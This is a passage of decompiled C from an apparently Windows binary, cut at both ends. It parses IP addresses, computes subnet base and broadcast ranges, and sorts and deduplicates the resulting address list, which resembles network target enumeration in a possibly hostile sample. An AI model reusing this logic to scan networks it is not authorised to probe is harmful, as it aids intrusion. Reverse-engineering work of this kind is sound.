                                                        int32_t * v76 = (int32_t *)(v74 - 4); // 0x4092fc_0
                                                        *v76 = v73 + 4;
                                                        int32_t * v77 = (int32_t *)(v74 - 8); // 0x4092fd_1
                                                        *v77 = 0x409302;
                                                        int32_t v78 = inet_addr(cp); // 0x4092fd
                                                        v54 = v78;
                                                        v75 = v74;
                                                        if (v78 != -1) {
                                                            // 0x409309
                                                            if (v78 != 0) {
                                                                // 0x40930d
                                                                *v76 = v78;
                                                                *v77 = 0x409313;
                                                                if (function_409110((int32_t)cp) != 0) {
                                                                    // 0x40931a
                                                                    *(int32_t *)g8 = g2;
                                                                    *(int32_t *)(g8 - 4) = g3;
                                                                    *(int32_t *)(g8 - 8) = v54;
                                                                    *(int32_t *)(g8 - 12) = 0x409322;
                                                                    if (function_4090d0((int32_t)cp, uBytes2, 0) == 0) {
                                                                        int32_t * v79 = (int32_t *)(g8 + 8); // 0x409329_0
                                                                        *v79 = g7;
                                                                        int32_t * v80 = (int32_t *)(g8 + 4); // 0x40932a_1
                                                                        *v80 = 0x40932f;
                                                                        *v79 = htonl((int32_t)cp) | 255;
                                                                        *v80 = 0x409337;
                                                                        *v79 = ntohl((int32_t)cp);
                                                                        *v80 = g7;
                                                                        int32_t * v81 = (int32_t *)g8; // 0x409339_1
                                                                        *v81 = (int32_t)&g19;
                                                                        *v80 = htonl((int32_t)cp) & -256;
                                                                        *v81 = 0x409346;
                                                                        *v80 = ntohl((int32_t)cp);
                                                                        *v81 = *(int32_t *)(g8 + 52);
                                                                        *(int32_t *)(g8 - 4) = 0x409351;
                                                                        function_408e50((int32_t)cp, uBytes2, 0, 0);
                                                                        v75 = g8 + 12;
                                                                        // branch -> 0x409354
                                                                    } else {
                                                                        v75 = g8 + 12;
                                                                    }
                                                                } else {
                                                                    v75 = g8 + 4;
                                                                }
                                                            } else {
                                                                v75 = v74;
                                                            }
                                                        }
                                                        int32_t v82 = *(int32_t *)g5; // 0x409354
                                                        g5 = v82;
                                                        if (v82 == 0) {
                                                            // break -> 0x40935a
                                                            break;
                                                        }
                                                        v74 = v75;
                                                        v73 = v82;
                                                        // continue -> 0x4092f9
                                                    }
                                                    // 0x40935a
                                                    v54 = *(int32_t *)(v75 + 32);
                                                    v72 = v75;
                                                    // branch -> 0x40935e
                                                } else {
                                                    v72 = g8;
                                                }
                                            } else {
                                                v72 = g8;
                                            }
                                        }
                                        // 0x40935e
                                        *(int32_t *)(v72 - 4) = v54;
                                        *(int32_t *)(v72 - 8) = (int32_t)&g20;
                                        g1 = (int32_t)LocalFree(cp);
                                        g7 = *(int32_t *)(v72 + 20);
                                        v70 = v72;
                                        // branch -> 0x409369
                                    }
                                    // 0x409369
                                    g5 = *(int32_t *)(v70 + 24);
                                    v48 = v70;
                                    // branch -> 0x40936d
                                } else {
                                    v48 = v4;
                                }
                            } else {
                                v48 = v4;
                            }
                        } else {
                            v48 = v4;
                        }
                    }
                    int32_t v83 = *(int32_t *)g5; // 0x40936d
                    *(int32_t *)(v48 + 24) = v83;
                    if (v83 == 0) {
                        // 0x40937b
                        v5 = g7;
                        // branch -> 0x40937b
                        // 0x40937b
                        v26 = *(int32_t *)v5;
                        g7 = v26;
                        if (v26 != 0) {
                          lab_0x4091ba:
                            // 0x4091ba
                            g7 = v26;
                            // branch -> 0x4091be
                            break;
                        }
                        // 0x409389
                        v12 = (int32_t)cp;
                        g2 = v12;
                        v39 = *(int32_t *)(v12 + 8);
                        v40 = *(int32_t *)(v12 + 4);
                        g5 = v40;
                        if ((v39 - v40 & -4) > 64) {
                            // 0x4093ac
                            g1 = function_409680((int32_t *)v40, v39, 0, v3);
                            v31 = g5;
                            v37 = v31 + 64;
                            g7 = v37;
                            function_409750((int32_t *)v31, v37, 0);
                            v13 = g7;
                            if (v13 != g3) {
                                v32 = v13;
                                while (true) {
                                    // 0x4093c4
                                    v27 = *(int32_t *)v32;
                                    v38 = v32 - 4;
                                    v41 = *(int32_t *)v38;
                                    v10 = v38;
                                    v15 = v32;
                                    v33 = v32;
                                    if (v27 < v41) {
                                        v28 = v41;
                                        v14 = v32;
                                      lab_0x4093d2:;
                                        int32_t v84; // 0x4093dc
                                        int32_t v85; // 0x4093d4
                                        while (true) {
                                            // 0x4093d2
                                            *(int32_t *)v14 = v28;
                                            v85 = v10;
                                            int32_t v86 = v85 - 4; // 0x4093d4
                                            uint32_t v87 = *(int32_t *)v86; // 0x4093d4
                                            v10 = v86;
                                            v84 = v27;
                                            if (v84 >= v87) {
                                                // break -> 0x4093e0
                                                break;
                                            }
                                            v28 = v87;
                                            v14 = v85;
                                            // continue -> 0x4093d2
                                        }
                                        // 0x4093e0
                                        v27 = v84;
                                        v15 = v85;
                                        v33 = g7;
                                        // branch -> 0x4093e0
                                    }
                                  lab_0x4093e0:
                                    // 0x4093e0
                                    g7 = v33 + 4;
                                    *(int32_t *)v15 = v27;
                                    int32_t v88 = g7; // 0x4093e5
                                    if (v88 == g3) {
                                        // break -> 0x4093e9
                                        break;
                                    }
                                    v32 = v88;
                                    // continue -> 0x4093c4
                                }
                                // 0x4093e9
                                // branch -> 0x4093e9
                            }
                        } else {
                            // 0x4093a2
                            function_409750((int32_t *)v40, v39, 0);
                            // branch -> 0x4093e9
                        }
                        // 0x4093e9
                        v34 = g2;
                        v42 = *(int32_t *)(v34 + 8);
                        v43 = *(int32_t *)(v34 + 4);
                        v11 = v43;
                        if (v43 == v42) {
                            // 0x409408
                            v24 = v42;
                            v22 = v42;
                            v36 = v34;
                            // branch -> 0x409431
                            // 0x409431
                            v44 = *(int32_t *)(v36 + 8);
                            if (v22 == v44) {
                                // 0x409448
                                *(int32_t *)(v36 + 8) = v24;
                                LocalFree(NULL);
                                return 1;
                            }
                            v23 = v22;
                            *(int32_t *)v24 = *(int32_t *)v23;
                            v9 = v42 + 4;
                            v25 = v23 + 4;
                            while (v25 != v44) {
                                // 0x40943a
                                v23 = v25;
                                *(int32_t *)v9 = *(int32_t *)v23;
                                v9 += 4;
                                v25 = v23 + 4;
                                // continue -> 0x40943a
                            }
                            // 0x409448
                            // branch -> 0x409448
                            // 0x409448
                            *(int32_t *)(g2 + 8) = v9;
                            LocalFree(NULL);
                            return 1;
                        }
                        // 0x4093f5
                        v7 = v43 + 4;
                        if (v7 == v42) {
                            // 0x409408
                            // branch -> 0x409408
                            // 0x409408
                            v11 = v42;
                            v24 = v42;
                            v22 = v42;
                            v36 = v34;
                            // branch -> 0x409431
                        } else {
                            v16 = v43;
                            v8 = v7;
                            while (true) {
                                // 0x4093fc
                                if (*(int32_t *)v16 == *(int32_t *)v8) {
                                    // 0x40940c
                                    if (v16 != v42) {
                                        // 0x40941b
                                        v11 = v8;
                                        v10 = v8;
                                        int32_t v89 = v42; // 0x40942d94
                                        v17 = v8;
                                        v20 = v8;
                                        v18 = v16;
                                        // branch -> 0x40941b
                                        while (true) {
                                            // 0x40941b
                                            v29 = *(int32_t *)v17;
                                            v30 = v89;
                                            v19 = v18;
                                            v35 = v17;
                                            v21 = v20;
                                            if (*(int32_t *)v18 != v29) {
                                              lab_0x409423:
                                                // 0x409423
                                                *(int32_t *)v20 = v29;
                                                int32_t v90 = v10; // 0x409425
                                                int32_t v91 = v11 + 4; // 0x409427
                                                v11 = v91;
                                                v30 = v42;
                                                v19 = v90;
                                                v35 = v90;
                                                v21 = v91;
                                                // branch -> 0x40942a
                                            }
                                          lab_0x40942a:;
                                            int32_t v92 = v35 + 4; // 0x40942a
                                            v10 = v92;
                                            if (v92 == v30) {
                                                // break -> 0x409431
                                                break;
                                            }
                                            v89 = v30;
                                            v17 = v92;
                                            v20 = v21;
                                            v18 = v19;
                                            // continue -> 0x40941b
                                        }
                                        // 0x409431
                                        v24 = v21;
                                        v22 = v30;
                                        v36 = g2;
                                        // branch -> 0x409431
                                    } else {
                                        v24 = v42;
                                        v22 = v42;
                                        v36 = v34;
                                    }
                                } else {
                                  lab_0x409404:
                                    // 0x409404
                                    v11 = v8;
                                    int32_t v93 = v8 + 4; // 0x4093f5
                                    if (v93 == v42) {
                                        // break -> 0x409408
                                        break;
                                    }
                                    v16 = v8;
                                    v8 = v93;
                                    // continue -> 0x4093fc
                                    continue;
                                }
                                // 0x409431
                                v44 = *(int32_t *)(v36 + 8);
                                if (v22 == v44) {
                                    // 0x409448
                                    *(int32_t *)(v36 + 8) = v24;
                                    LocalFree(NULL);
                                    return 1;
                                }
                                v23 = v22;
                                *(int32_t *)v24 = *(int32_t *)v23;
                                v9 = v11 + 4;
                                v25 = v23 + 4;
                                while (v25 != v44) {
                                    // 0x40943a
                                    v23 = v25;
                                    *(int32_t *)v9 = *(int32_t *)v23;
                                    v9 += 4;
                                    v25 = v23 + 4;
                                    // continue -> 0x40943a
                                }
                                // 0x409448
                                // branch -> 0x409448
                                // 0x409448
                                *(int32_t *)(g2 + 8) = v9;
                                LocalFree(NULL);
                                return 1;
                            }
                        }
                        // 0x409431
                        v44 = *(int32_t *)(v36 + 8);
                        if (v22 == v44) {
                            // 0x409448
                            *(int32_t *)(v36 + 8) = v24;
                            LocalFree(NULL);
                            return 1;
                        }
                        v23 = v22;
                        *(int32_t *)v24 = *(int32_t *)v23;
                        v9 = v11 + 4;
                        v25 = v23 + 4;
                        while (v25 != v44) {
                            // 0x40943a
                            v23 = v25;
                            *(int32_t *)v9 = *(int32_t *)v23;
                            v9 += 4;
                            v25 = v23 + 4;
                            // continue -> 0x40943a
                        }
                        // 0x409448
                        // branch -> 0x409448
                        // 0x409448
                        *(int32_t *)(g2 + 8) = v9;
                        LocalFree(NULL);
                        return 1;
                    }
                    int32_t v94 = *(int32_t *)(g8 + 24); // 0x4091d2
                    g5 = v94;
                    v6 = v94;
                    // branch -> 0x4091d6
                }
            }
            // 0x40937b
            v26 = *(int32_t *)v5;
            g7 = v26;
            if (v26 != 0) {
                goto lab_0x4091ba;
            }
            // 0x409389
            v12 = (int32_t)cp;
            g2 = v12;
            v39 = *(int32_t *)(v12 + 8);
            v40 = *(int32_t *)(v12 + 4);
            g5 = v40;
            if ((v39 - v40 & -4) > 64) {
                // 0x4093ac
                g1 = function_409680((int32_t *)v40, v39, 0, v3);
                v31 = g5;
                v37 = v31 + 64;
                g7 = v37;
                function_409750((int32_t *)v31, v37, 0);
                v13 = g7;
                if (v13 != g3) {
                    v32 = v13;
                    while (true) {
                        // 0x4093c4
                        v27 = *(int32_t *)v32;
                        v38 = v32 - 4;
                        v41 = *(int32_t *)v38;
                        v10 = v38;
                        if (v27 < v41) {
                            v28 = v41;
                            v14 = v32;
                            goto lab_0x4093d2;
                        }
                        v15 = v32;
                        v33 = v32;
                        goto lab_0x4093e0;
                    }
                }
            } else {
                // 0x4093a2
                function_409750((int32_t *)v40, v39, 0);
                // branch -> 0x4093e9
            }
            // 0x4093e9
            v34 = g2;
            v42 = *(int32_t *)(v34 + 8);
            v43 = *(int32_t *)(v34 + 4);
            v11 = v43;
            if (v43 == v42) {
                // 0x409408
                v24 = v42;
                v22 = v42;
                v36 = v34;
                // branch -> 0x409431
                // 0x409431
                v44 = *(int32_t *)(v36 + 8);
                if (v22 == v44) {
                    // 0x409448
                    *(int32_t *)(v36 + 8) = v24;
                    LocalFree(NULL);
                    return 1;
                }
                v23 = v22;
                *(int32_t *)v24 = *(int32_t *)v23;
                v9 = v42 + 4;
                v25 = v23 + 4;
                while (v25 != v44) {
                    // 0x40943a
                    v23 = v25;
                    *(int32_t *)v9 = *(int32_t *)v23;
                    v9 += 4;
                    v25 = v23 + 4;
                    // continue -> 0x40943a
                }
                // 0x409448
                // branch -> 0x409448
                // 0x409448
                *(int32_t *)(g2 + 8) = v9;
                LocalFree(NULL);
                return 1;
            }
            // 0x4093f5
            v7 = v43 + 4;
            if (v7 == v42) {
                // 0x409408
                // branch -> 0x409408
                // 0x409408
                v11 = v42;
                v24 = v42;
                v22 = v42;
                v36 = v34;
                // branch -> 0x409431
            } else {
                v16 = v43;
                v8 = v7;
                while (true) {
                    // 0x4093fc
                    if (*(int32_t *)v16 != *(int32_t *)v8) {
                        goto lab_0x409404;
                    }
                    // 0x40940c
                    if (v16 != v42) {
                        // 0x40941b
                        v11 = v8;
                        v10 = v8;
                        v17 = v8;
                        v20 = v8;
                        v18 = v16;
                        // branch -> 0x40941b
                        while (true) {
                            // 0x40941b
                            v29 = *(int32_t *)v17;
                            if (*(int32_t *)v18 == v29) {
                                v30 = v42;
                                v19 = v18;
                                v35 = v17;
                                v21 = v20;
                                goto lab_0x40942a;
                            }
                            goto lab_0x409423;
                        }
                    } else {
                        v24 = v42;
                        v22 = v42;
                        v36 = v34;
                    }
                }
            }
            // 0x409431
            v44 = *(int32_t *)(v36 + 8);
            if (v22 == v44) {
                // 0x409448
                *(int32_t *)(v36 + 8) = v24;
                LocalFree(NULL);
                return 1;
            }
            v23 = v22;
            *(int32_t *)v24 = *(int32_t *)v23;
            v9 = v11 + 4;
            v25 = v23 + 4;
            while (v25 != v44) {
                // 0x40943a
                v23 = v25;
                *(int32_t *)v9 = *(int32_t *)v23;
                v9 += 4;
                v25 = v23 + 4;
                // continue -> 0x40943a
            }
            // 0x409448
            // branch -> 0x409448
            // 0x409448
            *(int32_t *)(g2 + 8) = v9;
            LocalFree(NULL);
            return 1;
        }
    }
    // 0x4091ae
    return 0;
}

// Address range: 0x409470 - 0x40967f
int32_t function_409470(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a3;
    int32_t v3 = a2; // ebp
    int32_t v4 = g4; // edi
    int32_t result4 = *(int32_t *)(g4 + 8); // 0x409481
    int32_t result5 = result4; // eax
    int32_t v5; // ebx
    int32_t v6; // ecx
    int32_t v7; // edx
    int32_t v8; // esi
    if ((*(int32_t *)(g4 + 12) - result4) / 4 < a2) {
        int32_t v9 = *(int32_t *)(g4 + 4); // 0x409494
        int32_t v10;
        int32_t v11; // 0x4094b5140
        if (v9 == 0) {
            // 0x4094ac
            v11 = a2;
            v10 = 0;
            // branch -> 0x4094b5
        } else {
            int32_t v12 = (result4 - v9) / 4; // 0x40949f
            int32_t v13 = v12; // 0x4094b5141
            if (v12 <= a2) {
                // 0x4094a8
                v13 = a2;
                // branch -> 0x4094b0
            }
            // 0x4094b0
            v11 = v13;
            v10 = v12;
            // branch -> 0x4094b5
        }
        int32_t v14 = v10 + v11; // 0x4094b5
        result5 = v14;
        int32_t v15 = v14; // 0x4094c1
        if (v14 <= 0xffffffff) {
            // 0x4094bf
            result5 = 0;
            v15 = 0;
            // branch -> 0x4094c1
        }
        // 0x4094c1
        _qm__qm_2_YAPAXI_Z(4 * v15);
        v5 = v1;
        int32_t v16 = result5; // 0x4094d2
        v6 = v16;
        int32_t v17 = *(int32_t *)(v4 + 4); // 0x4094d8
        result5 = v17;
        int32_t v18 = v1; // 0x40951c132
        int32_t v19 = v16; // 0x4094f6
        if (v17 != v1) {
            int32_t v20 = v1; // 0x4094f0123
            int32_t v21 = v16; // 0x4094e8
            int32_t v22; // 0x4094ed
            int32_t v23; // 0x4094f0
            while (true) {
                // 0x4094e2
                v23 = v20;
                int32_t v24 = 0; // 0x4094ed
                int32_t v25 = v17; // 0x4094ea
                if (v21 != 0) {
                    // 0x4094e6
                    *(int32_t *)v21 = *(int32_t *)v17;
                    v23 = v5;
                    v24 = v6;
                    v25 = result5;
                    // branch -> 0x4094ea
                }
                int32_t v26 = v25 + 4; // 0x4094ea
                result5 = v26;
                v22 = v24 + 4;
                v6 = v22;
                if (v26 == v23) {
                    // break -> 0x4094f4
                    break;
                }
                v20 = v23;
                v17 = v26;
                v21 = v22;
                // continue -> 0x4094e2
            }
            // 0x4094f4
            v18 = v23;
            v19 = v22;
            // branch -> 0x4094f4
        }
        // 0x4094f4
        result5 = v19;
        int32_t v27 = 0; // 0x409515
        if (v3 != 0) {
            // 0x4094fa
            v7 = v3;
            int32_t v28 = v3; // 0x40950f128
            // branch -> 0x409500
            while (true) {
                int32_t v29 = v28; // 0x40950f
                int32_t v30 = 0; // 0x40950c
                if (v19 != 0) {
                    // 0x409504
                    *(int32_t *)v19 = *(int32_t *)v2;
                    v29 = v7;
                    v30 = result5;
                    // branch -> 0x40950c
                }
                int32_t v31 = v30 + 4; // 0x40950c
                result5 = v31;
                int32_t v32 = v29 - 1; // 0x40950f
                v7 = v32;
                if (v32 == 0) {
                    // break -> 0x409512
                    break;
                }
                v28 = v32;
                v19 = v31;
                // continue -> 0x409500
            }
            // 0x409512
            v19 = v6;
            v18 = v5;
            v27 = 4 * v3;
            // branch -> 0x409512
        }
        int32_t v33 = *(int32_t *)(g4 + 8); // 0x409512
        int32_t v34 = v27 + v19; // 0x40951e
        v7 = v34;
        if (v18 != v33) {
            // 0x409523
            result5 = v18;
            int32_t v35 = v33; // 0x409539138
            // branch -> 0x40952b
            while (true) {
                int32_t v36 = v35; // 0x409539
                int32_t v37 = 0; // 0x409536
                int32_t v38 = v18; // 0x409533
                if (v34 != 0) {
                    // 0x40952f
                    *(int32_t *)v34 = *(int32_t *)v18;
                    v36 = v33;
                    v37 = v7;
                    v38 = result5;
                    // branch -> 0x409533
                }
                int32_t v39 = v38 + 4; // 0x409533
                result5 = v39;
                int32_t v40 = v37 + 4; // 0x409536
                v7 = v40;
                if (v39 == v36) {
                    // break -> 0x40953d
                    break;
                }
                v35 = v36;
                v18 = v39;
                v34 = v40;
                // continue -> 0x40952b
            }
            // 0x40953d
            // branch -> 0x40953d
        }
        // 0x40953d
        v8 = g4;
        int32_t v41 = *(int32_t *)(g4 + 4); // 0x409541
        g1 = v41;
        function_4097fe((char *)v41);
        v7 = v16;
        *(int32_t *)(v8 + 12) = v16 + 4 * v14;
        int32_t * v42 = (int32_t *)(v8 + 4); // 0x40955f_0
        int32_t v43 = *v42; // 0x40955f
        if (v43 == 0) {
            // 0x409566
            *v42 = v7;
            int32_t result = v7 + 4 * v3; // 0x40956e
            *(int32_t *)(v8 + 8) = result;
            return result;
        }
        int32_t v44 = *(int32_t *)(v8 + 8); // 0x40957d
        *v42 = v7;
        int32_t result2 = 4 * (v3 + (v44 - v43) / 4) + v7; // 0x40958b
        *(int32_t *)(v8 + 8) = result2;
        return result2;
    }
    // 0x40959a
    v7 = v1;
    if ((result4 - v1) / 4 < a2) {
        int32_t v45 = 4 * a2; // 0x4095a9
        v5 = v45;
        int32_t v46 = v45 + v1; // 0x4095b2
        v8 = v46;
        int32_t v47 = a2; // 0x4095df
        int32_t v48 = v1; // 0x4095da
        int32_t v49 = g4; // 0x4095d1
        if (result4 != v1) {
            // 0x4095b7
            v6 = v1;
            int32_t v50 = g4; // 0x4095d1105
            int32_t v51 = result4; // 0x4095cd102
            // branch -> 0x4095bb
            int32_t v52; // 0x4095d1104
            while (true) {
                // 0x4095bb
                v52 = v50;
                int32_t v53 = v51; // 0x4095cd
                int32_t v54 = 0; // 0x4095ca
                int32_t v55 = v1; // 0x4095c7
                if (v46 != 0) {
                    // 0x4095bf
                    *(int32_t *)v46 = *(int32_t *)v1;
                    v4 = g4;
                    v52 = g4;
                    v53 = result5;
                    v54 = v8;
                    v55 = v6;
                    // branch -> 0x4095c7
                }
                int32_t v56 = v55 + 4; // 0x4095c7
                v6 = v56;
                int32_t v57 = v54 + 4; // 0x4095ca
                v8 = v57;
                if (v56 == v53) {
                    // break -> 0x4095d1
                    break;
                }
                v50 = v52;
                v51 = v53;
                v1 = v56;
                v46 = v57;
                // continue -> 0x4095bb
            }
            // 0x4095d1
            v47 = v3;
            v48 = v7;
            v49 = v52;
            // branch -> 0x4095d1
        }
        int32_t v58 = *(int32_t *)(v49 + 8); // 0x4095d1
        result5 = v58;
        v8 = v2;
        int32_t v59 = (v58 - v48) / 4; // 0x4095dc
        int32_t v60 = v47 - v59; // 0x4095df
        v3 = v60;
        if (v47 != v59) {
            while (true) {
                int32_t v61 = v60; // 0x4095ee
                int32_t v62 = 0; // 0x4095eb
                if (v58 != 0) {
                    // 0x4095e7
                    *(int32_t *)v58 = *(int32_t *)v8;
                    v61 = v3;
                    v62 = result5;
                    // branch -> 0x4095eb
                }
                int32_t v63 = v62 + 4; // 0x4095eb
                result5 = v63;
                int32_t v64 = v61 - 1; // 0x4095ee
                v3 = v64;
                if (v64 == 0) {
                    // break -> 0x4095f1
                    break;
                }
                v60 = v64;
                v58 = v63;
                // continue -> 0x4095e3
            }
            // 0x4095f1
            v48 = v7;
            v49 = v4;
            // branch -> 0x4095f1
        }
        int32_t v65 = *(int32_t *)(v49 + 8); // 0x4095f1
        int32_t result3; // 0x409608
        int32_t * v66; // 0x409605_0
        if (v48 == v65) {
            // 0x409605
            v66 = (int32_t *)(v49 + 8);
            result3 = v5 + *v66;
            *v66 = result3;
            return result3;
        }
        *(int32_t *)v48 = *(int32_t *)v8;
        int32_t v67 = v48 + 4; // 0x4095fe
        while (v67 != v65) {
            // 0x4095fa
            *(int32_t *)v67 = *(int32_t *)v8;
            v67 += 4;
            // continue -> 0x4095fa
        }
        // 0x409605
        // branch -> 0x409605
        // 0x409605
        v66 = (int32_t *)(v4 + 8);
        result3 = v5 + *v66;
        *v66 = result3;
        return result3;
    }
    // 0x409617
    if (a2 == 0) {
        // 0x40966f
        return result4;
    }
    int32_t v68 = 4 * a2; // 0x40961b
    v3 = v68;
    v8 = result4;
    int32_t v69 = result4 - v68; // 0x409622
    v6 = v69;
    int32_t v70 = 0; // 0x40963f
    int32_t v71 = g4; // 0x40963a
    if (v68 != 0) {
        while (true) {
            int32_t v72 = result4; // 0x409636
            int32_t v73 = 0; // 0x409633
            int32_t v74 = v69; // 0x409630
            if (result4 != 0) {
                // 0x40962c
                *(int32_t *)result4 = *(int32_t *)v69;
                v72 = result5;
                v73 = v8;
                v74 = v6;
                // branch -> 0x409630
            }
            int32_t v75 = v74 + 4; // 0x409630
            v6 = v75;
            int32_t v76 = v73 + 4; // 0x409633
            v8 = v76;
            if (v75 == v72) {
                // break -> 0x40963a
                break;
            }
            result4 = v76;
            v69 = v75;
            // continue -> 0x409628
        }
        // 0x40963a
        v1 = v7;
        v70 = v3;
        v71 = v4;
        // branch -> 0x40963a
    }
    int32_t v77 = *(int32_t *)(v71 + 8); // 0x40963a
    int32_t v78 = v77 - v70; // 0x40963f
    int32_t v79 = v1; // 0x409654
    int32_t v80; // 0x409665
    int32_t v81; // 0x409665156
    int32_t * v82; // 0x40966c_0
    int32_t v83; // 0x40966c
    if (v1 != v78) {
        int32_t v84 = v78 - 4; // 0x409645160
        int32_t v85 = v77 - 4; // 0x40964b163
        *(int32_t *)v85 = *(int32_t *)v84;
        if (v84 != v1) {
            int32_t v86 = v84 - 4; // 0x409645
            int32_t v87 = v85 - 4; // 0x40964b
            *(int32_t *)v87 = *(int32_t *)v86;
            while (v86 != v7) {
                // 0x409645
                v86 -= 4;
                v87 -= 4;
                *(int32_t *)v87 = *(int32_t *)v86;
                // continue -> 0x409645
            }
            // 0x409654
            v70 = v3;
            v79 = v7;
            // branch -> 0x409654
            // 0x409654
            v6 = v79 + v70;
            result5 = v79;
            v83 = 0;
            if (v70 != 0) {
                // 0x40965d
                *(int32_t *)v79 = *a3;
                v81 = result5 + 4;
                result5 = v81;
                if (v81 != v6) {
                    *(int32_t *)v81 = *(int32_t *)v2;
                    v80 = result5 + 4;
                    result5 = v80;
                    while (v80 != v6) {
                        // 0x409661
                        *(int32_t *)v80 = *(int32_t *)v2;
                        v80 = result5 + 4;
                        result5 = v80;
                        // continue -> 0x409661
                    }
                    // 0x40966c
                    // branch -> 0x40966c
                    // 0x40966c
                    v82 = (int32_t *)(v4 + 8);
                    *v82 = *v82 + v3;
                    // branch -> 0x40966f
                    // 0x40966f
                    return result5;
                }
                // 0x40966c
                v83 = v3;
                // branch -> 0x40966c
            }
            // 0x40966c
            v82 = (int32_t *)(v4 + 8);
            *v82 = *v82 + v83;
            // branch -> 0x40966f
            // 0x40966f
            return result5;
        }
        // 0x409654
        v70 = v3;
        v79 = v7;
        // branch -> 0x409654
    }
    // 0x409654
    v6 = v79 + v70;
    result5 = v79;
    v83 = 0;
    if (v70 != 0) {
        // 0x40965d
        *(int32_t *)v79 = *a3;
        v81 = result5 + 4;
        result5 = v81;
        if (v81 != v6) {
            *(int32_t *)v81 = *(int32_t *)v2;
            v80 = result5 + 4;
            result5 = v80;
            while (v80 != v6) {
                // 0x409661
                *(int32_t *)v80 = *(int32_t *)v2;
                v80 = result5 + 4;
                result5 = v80;
                // continue -> 0x409661
            }
            // 0x40966c
            // branch -> 0x40966c
            // 0x40966c
            v82 = (int32_t *)(v4 + 8);
            *v82 = *v82 + v3;
            // branch -> 0x40966f
            // 0x40966f
            return result5;
        }
        // 0x40966c
        v83 = v3;
        // branch -> 0x40966c
    }
    // 0x40966c
    v82 = (int32_t *)(v4 + 8);
    *v82 = *v82 + v83;
    // branch -> 0x40966f
    // 0x40966f
    return result5;
}

// Address range: 0x409680 - 0x40974f
int32_t function_409680(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = a2; // ebx
    int32_t v3 = g5; // 0x409685
    g5 = v1;
    int32_t result = a2 - v1; // 0x40968c
    if ((result & -4) < 65) {
        // 0x409742
        g5 = v3;
        return result;
    }
    int32_t v4 = g2; // 0x40969c
    int32_t v5 = g7; // bp-16
    // branch -> 0x40969e
  lab_0x40969e:
    while (true) {
        uint32_t v6 = *(int32_t *)v1; // 0x4096a2
        int32_t v7 = v6; // ecx
        uint32_t v8 = *(int32_t *)(a2 - 4); // 0x4096a4
        uint32_t v9 = *(int32_t *)(4 * (result / 4 - (result >> 31)) / 2 + v1); // 0x4096ab
        int32_t v10; // eax
        int32_t v11;
        uint32_t v12; // 0x4096e2
        int32_t v13; // 0x4096ce34
        if (v6 < v9) {
            // 0x4096b2
            if (v9 < v8) {
              lab_0x4096c8:
                // 0x4096c8
                v7 = v9;
                v13 = v9;
                // branch -> 0x4096ca
            } else {
                // 0x4096b6
                if (v6 < v8) {
                    // 0x4096ba
                    v7 = v8;
                    v13 = v8;
                    // branch -> 0x4096ca
                } else {
                    v13 = v6;
                }
            }
          lab_0x4096ca_2:
            // 0x4096ca
            v10 = a2;
            v12 = v13;
            v11 = v1;
            // branch -> 0x4096ce
          lab_0x4096ce:;
            int32_t result2; // 0x409730
            while (true) {
                // 0x4096ce
                g7 = v11;
                uint32_t v14 = v11; // 0x4096f6
                int32_t v15; // 0x4096f4
                int32_t v16; // 0x4096e6
                int32_t v17; // 0x4096dc
                if (*(int32_t *)v11 < v12) {
                    int32_t v18 = v11 + 4; // 0x4096d2
                    g7 = v18;
                    v14 = v18;
                    while (*(int32_t *)v18 < v12) {
                        // 0x4096d2
                        v18 += 4;
                        g7 = v18;
                        v14 = v18;
                        // continue -> 0x4096d2
                    }
                    // 0x4096dc
                    v17 = v10 - 4;
                    v10 = v17;
                    v15 = v17;
                    if (v12 < *(int32_t *)v17) {
                        v16 = v17;
                      lab_0x4096e6:
                        while (true) {
                            int32_t v19 = v16 - 4; // 0x4096e6
                            v10 = v19;
                            if (v12 >= *(int32_t *)v19) {
                                v15 = v19;
                                // break -> 0x4096f0
                                break;
                            }
                            v16 = v19;
                            // continue -> 0x4096e6
                        }
                        // 0x4096f0
                        if (v15 > v14) {
                          lab_0x4096f4:;
                            int32_t v20 = *(int32_t *)v15; // 0x4096f4
                            g2 = v20;
                            int32_t * v21 = (int32_t *)v14; // 0x4096f6_0
                            *v21 = v20;
                            *(int32_t *)v10 = *v21;
                            v12 = v7;
                            v11 = g7 + 4;
                            // branch -> 0x4096ce
                            continue;
                        } else {
                          lab_0x409701:;
                            int32_t v22 = v2; // 0x409701
                            int32_t v23 = g5; // 0x409707
                            int32_t v24; // 0x40972c
                            int32_t v25; // 0x40972e
                            if ((v22 - v14 & -4) > (v14 - v23 & -4)) {
                                // 0x409722
                                function_409680((int32_t *)v23, v14, 0, v5);
                                v24 = g7;
                                g5 = v24;
                                v25 = v2;
                                // branch -> 0x40972e
                            } else {
                                // 0x409714
                                function_409680((int32_t *)v14, v22, 0, v5);
                                int32_t v26 = g7; // 0x40971e
                                v2 = v26;
                                v24 = g5;
                                v25 = v26;
                                // branch -> 0x40972e
                            }
                            // 0x40972e
                            result2 = v25 - v24;
                            if ((result2 & -4) <= 64) {
                                // break (via goto) -> 0x409740
                                goto lab_0x409740;
                            }
                            a2 = v25;
                            v1 = v24;
                            result = result2;
                            // continue (via goto) -> 0x40969e
                            goto lab_0x40969e;
                        }
                    }
                  lab_0x4096f0:
                    // 0x4096f0
                    if (v15 > v14) {
                        goto lab_0x4096f4;
                    }
                    goto lab_0x409701;
                }
                // 0x4096dc
                v17 = v10 - 4;
                v10 = v17;
                if (v12 < *(int32_t *)v17) {
                    v16 = v17;
                    goto lab_0x4096e6;
                }
                v15 = v17;
                goto lab_0x4096f0;
            }
          lab_0x409740:
            // 0x409740
            g7 = v5;
            g2 = v4;
            // branch -> 0x409742
            // 0x409742
            g5 = v3;
            return result2;
        }
        // 0x4096be
        if (v6 < v8) {
            v13 = v6;
            goto lab_0x4096ca_2;
        }
        // 0x4096c2
        v7 = v8;
        if (v9 < v8) {
            v13 = v8;
            goto lab_0x4096ca_2;
        }
        goto lab_0x4096c8;
        // 0x4096ca
        v10 = a2;
        v12 = v13;
        v11 = v1;
        // branch -> 0x4096ce
        goto lab_0x4096ce;
    }
}

// Address range: 0x409750 - 0x4097af
int32_t function_409750(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = v1; // ebx
    int32_t v3;
    if (v1 == a2) {
        // 0x4097aa
        g3 = v3;
        return g1;
    }
    int32_t v4 = v1 + 4; // 0x40975f
    int32_t v5 = v4; // edi
    if (v4 == a2) {
